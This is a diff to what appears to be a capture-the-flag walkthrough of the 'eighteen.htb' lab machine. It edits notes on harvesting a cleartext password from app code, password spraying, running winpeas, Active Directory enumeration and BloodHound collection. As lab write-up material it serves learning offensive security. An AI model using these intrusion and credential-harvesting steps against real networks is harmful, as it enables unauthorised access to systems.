@@ -204,7 +204,7 @@ nmap -T4 -p- -A -Pn -v eighteen.htb
     dir C:\Users
     ```
 
-* we get one more cleartext password 'MissThisElite$90' from the Python app code for user 'appdev'
+* we get one more cleartext password 'MissThisElite$90' from the Python app code for user 'appdev' - attempting a password spray for other users does not help here
 
 * enumerating other subfolders do not give a lot of clues, so we can start by checking via ```winpeas```:
 
@@ -218,20 +218,7 @@ nmap -T4 -p- -A -Pn -v eighteen.htb
     .\winpeas.exe
     ```
 
-* findings from ```winpeas```:
-
-    * no AV running on box
-    * network info indicates other machines in network
-
-* network enumeration:
-
-    ```ps
-    ipconfig /all
-    # shows only one interface
-
-    arp -a
-    # ARP table shows other machines in 10.129.251.x subnet
-    ```
+* not a lot of findings from ```winpeas```, only thing it shows is that there is no AV running on the box
 
 * AD enumeration:
 
@@ -246,7 +233,7 @@ nmap -T4 -p- -A -Pn -v eighteen.htb
     # check 'Domain Admins' group - only Administrator is part of this group
     ```
 
-* as it is a AD environment and there seem to be multiple boxes in the network, we can use ```bloodhound``` to get info from this box first:
+* as it is a AD environment, we can use ```bloodhound``` to get info from this box first:
 
     ```ps
     # fetch collector script from attacker
